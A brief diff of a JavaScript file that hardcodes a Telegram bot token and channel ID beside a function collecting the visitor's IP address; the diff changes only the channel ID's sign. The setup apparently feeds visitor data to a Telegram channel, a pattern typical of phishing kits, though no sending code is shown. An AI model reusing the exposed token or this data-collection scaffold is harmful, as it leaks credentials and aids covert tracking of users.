@@ -1,6 +1,6 @@
 
 var TelegramBot = "7818427676:AAET71rXWr5dYEWj-dfWTzZuB7v33Ihyf8k";
-var TelegramChannel = "-4659175856";
+var TelegramChannel = "4659175856";
 var ipData = getIP();
 
 function getIP(){
